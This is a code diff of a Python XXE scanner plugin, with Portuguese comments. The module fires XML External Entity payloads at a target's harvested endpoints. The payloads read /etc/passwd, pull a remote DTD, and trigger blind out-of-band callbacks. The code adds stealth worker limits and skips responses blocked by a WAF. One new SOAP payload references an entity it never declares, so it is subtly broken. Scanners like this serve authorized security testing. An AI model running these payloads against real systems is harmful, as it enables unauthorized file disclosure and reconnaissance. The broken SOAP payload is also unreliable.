@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-XXE (V10 Pro) — XML External Entity Injection detection.
-Detecta endpoints XML, SOAP e testa payloads stealth (Error-based + Blind OAST).
+XXE Detection (V10.1 Surgical) — XML External Entity.
+Detecta leitura de arquivos locais e interações OAST com filtros ante-WAF.
 """
 import json
 import time
 import httpx
 from pathlib import Path
-from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
@@ -16,169 +15,102 @@ from plugins import ensure_outdir
 from ..output import info, success, warn, error
 from ..http_utils import format_http_request, format_http_response
 
-def _build_payloads(oast_url: str | None = None, deep: bool = False):
-    payloads = []
+XXE_PAYLOADS = [
+    # Classic File Read
+    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "root:"),
+    # Error-Based
+    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://nonexistent-enum-allma.com/xxe.dtd">%remote;]><root>test</root>', "failed to load"),
+    # SOAP support
+    ('<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>', "root:"),
+]
 
-    # 1. Classic File Read (Local)
-    payloads.append({
-        "name": "Classic XXE (file read)",
-        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-        "detect": lambda body: any(x in body.lower() for x in ["root:x:", "localhost", "daemon:", "/bin/bash"]),
-    })
+WAF_STRINGS = ["cloudflare", "forbidden", "blocked", "access denied", "incident id"]
 
-    # 2. Error-based XXE (Stealthier)
-    payloads.append({
-        "name": "Error-based XXE (invalid file)",
-        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_file_allma_v10">]><foo>&xxe;</foo>',
-        "detect": lambda body: any(x in body.lower() for x in ["no such file", "failed to open", "error", "exception", "ioexception"]),
-    })
-
-    # 3. Blind XXE via OAST (Final Confirmation)
-    if oast_url:
-        payloads.append({
-            "name": "Blind XXE via OAST",
-            "body": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oast_url}/xxe_blind">%xxe;]><foo>test</foo>',
-            "detect": lambda body: False,  # Detectado out-of-band via Interactsh
-        })
-
-    if deep:
-        # Payloads adicionais para modo profundo
-        payloads.append({
-            "name": "XXE via PHP Wrapper",
-            "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
-            "detect": lambda body: len(body) > 20 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in body.strip()[:20]),
-        })
-
-    return payloads
-
-
-def _test_xxe(url: str, oast_url: str | None, deep: bool = False) -> list:
-    """Testa payloads XXE em um endpoint (XML e SOAP)."""
+def _test_xxe(url: str, oast_url: str = None) -> list:
+    """Testa XXE com payloads avançados e filtros cirúrgicos."""
     findings = []
-    payloads = _build_payloads(oast_url, deep)
     
-    content_types = ["application/xml", "text/xml", "application/soap+xml"]
+    # Adicionar payloads OAST se disponível
+    payloads = list(XXE_PAYLOADS)
+    if oast_url:
+        payloads.append(('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://' + oast_url + '/xxe">]><root>&xxe;</root>', "OAST_MARKER"))
 
-    for ct in content_types:
-        for payload_cfg in payloads:
-            time.sleep(REQUEST_DELAY)
-            try:
-                with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
-                    # Enviar POST com o payload
-                    resp = client.post(url, content=payload_cfg["body"], headers={
-                        "User-Agent": DEFAULT_USER_AGENT,
-                        "Content-Type": ct,
-                    })
-
-                    # FILTRO V10: Ignorar 403, 405, 429 e Cloudflare blocks
-                    # Muitos WAFs bloqueiam /etc/passwd ou DTDs com 403. Reportar isso é Falso Positivo.
-                    is_cloudflare = "cloudflare" in resp.text.lower() or "cf-ray" in resp.headers
-                    if resp.status_code in [403, 405, 429] or is_cloudflare:
+    for payload, expected in payloads:
+        time.sleep(REQUEST_DELAY)
+        try:
+            with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False) as client:
+                # Testar tanto application/xml quanto text/xml
+                for ctype in ["application/xml", "text/xml"]:
+                    resp = client.post(url, content=payload, headers={"Content-Type": ctype, "User-Agent": DEFAULT_USER_AGENT})
+                    
+                    # Filtro cirúrgico V10.1: Ignorar status de erro comuns de WAF
+                    if resp.status_code in [403, 405, 429]:
+                        continue
+                    
+                    body = resp.text.lower()
+                    if any(ws in body for ws in WAF_STRINGS):
                         continue
 
-                    detected = payload_cfg["detect"](resp.text)
+                    is_vuln = False
+                    reason = ""
+                    risk = "MEDIUM"
 
-                    # EXIGÊNCIA V10: CRITICAL apenas se detected for True (achado real no body)
-                    # OAST callback é tratado separadamente pelo report.
-                    if detected:
+                    # Confirmação Real V10.1
+                    if "root:x:" in body or "daemon:" in body or "/bin/bash" in body:
+                        is_vuln = True
+                        reason = "Indício real de leitura de arquivo (/etc/passwd) detectado no body."
+                        risk = "CRITICAL"
+                    elif expected != "OAST_MARKER" and expected.lower() in body:
+                        is_vuln = True
+                        reason = f"Payload avaliado com sucesso (reflexão de {expected})."
+                    
+                    if is_vuln:
                         findings.append({
                             "url": url,
-                            "content_type": ct,
-                            "payload_name": payload_cfg["name"],
-                            "status": resp.status_code,
-                            "risk": "CRITICAL",
                             "type": "XXE",
-                            "detected": True,
-                            "details": f"XXE CONFIRMADO ({payload_cfg['name']}) via {ct}: Vazamento de dados detectado no response!",
+                            "risk": risk,
+                            "details": reason,
+                            "payload": payload,
                             "request_raw": format_http_request(resp.request),
                             "response_raw": format_http_response(resp),
                         })
-                        return findings # Achou um crítico, para neste endpoint
-            except Exception:
-                pass
-
+                        break # Evita duplicar se ambos ctype funcionarem
+        except Exception:
+            pass
     return findings
-
 
 def run(context: dict):
     target = context.get("target")
-    deep = context.get("deep", False)
+    oast_url = context.get("oast_url")
     stealth = context.get("stealth", False)
     
     if not target:
         raise ValueError("Target required")
 
-    info(
-        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
-        f"   📄 {C.BOLD}{C.CYAN}XXE (XML EXTERNAL ENTITY) SCANNER (V10 PRO){C.END}\n"
-        f"   🎯 Alvo: {C.GREEN}{target}{C.END} | SOAP: Ativado | Stealth: {stealth}\n"
-        f"🟪───────────────────────────────────────────────────────────🟪\n"
-    )
-
+    info(f"\n🧪 {C.BOLD}{C.CYAN}XXE SCANNER (V10.1 SURGICAL){C.END}")
     outdir = ensure_outdir(target, "xxe")
 
-    # Ler OAST payload
-    oast_file = Path("output") / target / "oast_payload.txt"
-    oast_url = None
-    if oast_file.exists():
-        oast_url = oast_file.read_text().strip()
-        if oast_url:
-            info(f"   🔗 OAST OOB ATIVO: {C.YELLOW}{oast_url}{C.END}")
-
-    # Coletar URLs candidatas
+    # Mapear endpoints XML (heuristic)
     urls_file = Path("output") / target / "urls" / "urls_200.txt"
-    endpoint_file = Path("output") / target / "endpoint" / "endpoints.txt"
-
-    all_urls = set()
-    for f in [urls_file, endpoint_file]:
-        if f.exists():
-            all_urls.update(l.strip() for l in f.read_text(errors="ignore").splitlines() if l.strip())
-
-    # Heurística de endpoints XML/SOAP
-    xml_hints = ["api", "xml", "soap", "wsdl", "feed", "rss", "import", "upload", "parse", "webhook"]
     candidates = []
-    for url in all_urls:
-        path = urlparse(url).path.lower()
-        if any(h in path for h in xml_hints):
-            candidates.append(url)
-
-    # Base URLs
-    for scheme in ["https", "http"]:
-        candidates.append(f"{scheme}://{target}/api")
-
-    candidates = list(set(candidates))[:50]
+    if urls_file.exists():
+        urls = urls_file.read_text().splitlines()
+        candidates = [u for u in urls if any(x in u.lower() for x in [".xml", "/api/", "/graphql", "/soap"])]
     
-    # Modo Stealth / Deep workers
-    max_workers = 3 if stealth else 8
-    info(f"   📋 Testando {len(candidates)} endpoints candidatos (Filtro Cloudflare/WAF Ativo)")
-
+    candidates = list(set(candidates))[:50]
+    max_workers = 3 if stealth else 10
+    
     results = []
-    tests_run = 0
-
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        futures = {executor.submit(_test_xxe, url, oast_url, deep): url for url in candidates}
-
+        futures = {executor.submit(_test_xxe, url, oast_url): url for url in candidates}
         for future in as_completed(futures):
-            tests_run += 1
-            try:
-                findings = future.result()
-                if findings:
-                    results.extend(findings)
-                    for f in findings:
-                        info(f"   🔴 {C.RED}[CRITICAL]{C.END} {f['url']} — {f['payload_name']}")
-            except Exception:
-                pass
+            res = future.result()
+            if res:
+                results.extend(res)
+                for f in res:
+                    info(f"   🔴 {C.RED}[{f['risk']}]{C.END} XXE detectado em {f['url']}")
 
     output_file = outdir / "xxe_results.json"
-    output_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))
-
-    summary = {"tests_run": tests_run, "endpoints_checked": len(candidates), "findings": len(results), "status": "COMPLETED"}
-    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
-
-    if results:
-        success(f"\n   📄 🔴 {len(results)} XXE Confirmado(s) com sucesso!")
-    else:
-        info(f"   ✅ 0 XXE detectado em {len(candidates)} endpoints.")
-
+    output_file.write_text(json.dumps(results, indent=2))
     success(f"   📂 Resultados salvos em {output_file}")
     return results
